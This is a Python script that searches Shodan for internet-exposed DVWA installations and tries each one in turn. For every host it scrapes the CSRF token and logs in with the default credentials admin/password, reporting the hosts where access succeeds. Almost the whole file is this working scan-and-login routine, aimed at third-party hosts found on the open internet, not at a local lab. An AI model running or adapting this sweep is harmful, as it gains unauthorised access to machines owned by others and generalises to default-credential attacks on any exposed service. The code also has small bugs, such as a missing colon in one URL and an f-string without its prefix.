
#A
from shodan import Shodan
import time
import requests
import re

#B
shodan_key=input("Enter your shodan api key\n")
api=Shodan(shodan_key) # connect to the api server with key



#C
def request_page_from_shodan(query,page=1):  #make an api request for a page of 100 results. Just like entering in the search bar of shodan that we want to search for DVWA instances
    while True:

        try:
            instances=api.search(query,page=page)
            return  instances
        
        except :
            #print("error")
            time.sleep(5) #pause for 5seconds before making a new request


#D

def has_valid_credentials(instance):
    s=requests.Session()  #create a session object 
    keysInData=('ssl' in instance) and 'https' or 'http' #verify token and link validity

    try:
        result=s.get(f"{keysInData}://{instance['ip_str']}{instance['port']}/login.php", verify=False)    #make a request to the api server 
        
    except requests.exceptions.ConnectionError:  #invalid link
        return False
 
    if result.status_code!=200:   # verify response to the request made through status code
        print("[-] Got HTTP status code {res.status_code}, expected 200")
        return False
    
    #verify that we were given a token since the response was "OK" if this part runs 
    #searching for CSRF token using regex
    token=re.search(r"user_token' value='([0-9a-f]+)'",result.text).group(1)

# make a secure passing of data as post methods are not cached nor maintained in server logs
#logging in with default credentials => here we are simulating a user
    r=s.post( f"{keysInData}://{instance['ip_str']}:{instance['port']}/login.php", f"username=admin&password=password&user_token={token}&Login=Login", allow_redirects=False,verify=False,headers={'Content-Type': 'application/x-www-form-urlencoded'}   )

    if r.status_code==302 and r.headers['Location']=='index.php': # => Found and resource requested has been temporarily moved to the URL given by the Location header
        #authntification succeeded
        return True
    
    else:
        return  False  #protected link


#E

# Takes a page of results, and scans each of them, running has_valid_credentials

def process_page(page):
    result=[] #to hold all accessed instances
    for instance in page['matches']:
        if has_valid_credentials(instance):
            print(f"[+] valid credentials at : {instance['ip_str']}:{instance['port']}") #print port accessed and ip
            result.append(instance)
    return result

#F
#searches on shodan using the given query, and iterates over each page of the results
def query_shodan(query):
    print(" QUERYING first page")
    first=request_page_from_shodan(query)
    total=first['total']
    already_processed=len(first['matches'])
    result=process_page(first)
    page=2
    
    while already_processed<total:
        print(f"querying page {page}")
        page = request_page_from_shodan(query, page=page)
        already_processed += len(page['matches'])
        result += process_page(page)
        page += 1
    return result

# search for DVWA instances
result = query_shodan('title:dvwa')
print(result)



    